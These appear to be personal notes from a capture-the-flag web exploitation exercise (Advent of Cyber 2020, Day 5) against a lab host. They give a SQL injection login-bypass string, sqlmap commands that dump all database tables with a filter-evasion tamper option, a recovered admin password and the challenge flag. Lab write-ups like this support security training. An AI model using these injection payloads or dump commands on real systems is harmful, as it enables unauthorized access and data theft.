# Advent of cyber 2020

# [Day 5] Web Exploitation Someone stole Santa's gift list!

# My IP : 10.17.6.109

# Target IP : 10.10.143.189


# Port 8000
website
10.10.143.189:8000

hidden directory ------> /santapanel

this will work
	'OR 1=1 --


======SQLMAP stuff======

sqlmap -u "http://10.10.143.189:8000/santapanel?search=1" --dbs

sqlmap -r req --dbms sqlite --dump-all --tamper=space2comment


==========

```bash

sqlmap -r req --dbms sqlite --dump-all --tamper=space2comment | tee sql.log 
```

admin password is EhCNSWzzFP6sc7gB
flag is thmfox{All_I_Want_for_Christmas_Is_You} 
